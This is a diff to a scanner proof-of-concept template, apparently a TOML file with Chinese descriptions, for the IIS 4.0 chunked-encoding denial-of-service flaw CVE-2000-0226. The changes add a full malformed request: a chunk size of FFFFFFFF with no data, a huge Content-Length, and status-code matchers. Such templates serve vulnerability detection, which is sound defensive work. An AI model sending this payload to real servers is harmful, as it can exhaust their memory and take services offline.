@@ -1,10 +1,15 @@
 [info]
-author = "ave"
-description = "向 IIS 4.0 发送超大的分块编码 POST 请求，触发内存耗尽导致拒绝服务。通过构造畸形的 chunked transfer encoding 数据包，使服务器在处理大缓冲区时发生缓冲区溢出。"
+author = "AVE"
+description = "检测 Microsoft IIS 4.0 分块传输编码缓冲区溢出拒绝服务漏洞，通过发送携带超大分块大小（0xFFFFFFFF）声明的 POST 请求但不发送实际数据，触发服务器分配大量内存等待数据，最终耗尽系统资源"
 id = "POC-AVE-2000-0202"
-name = "Microsoft IIS 4.0 分块传输编码缓冲区溢出拒绝服务漏洞 PoC"
+name = "CVE-2000-0226 PoC"
 severity = "medium"
-tags = ["ave-2000-0202"]
+tags = [
+    "cve-2000-0226",
+    "iis",
+    "dos",
+    "chunked-transfer",
+]
 vuln_id = [
     "CVE-2000-0226",
     "AVE-2000-0202",
@@ -20,18 +25,20 @@ protocol = "http"
 
 [poc.requests.body]
 content = """
-1\r
-a\r
-0\r
-\r
+FFFFFFFF\r
 """
 type = "raw"
 
+[poc.requests.headers]
+Content-Length = "999999999"
+Transfer-Encoding = "chunked"
+User-Agent = "AVE/1.0"
+
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "500",
-    "Connection Reset",
+status = [
+    408,
+    500,
+    503,
 ]
+type = "status"
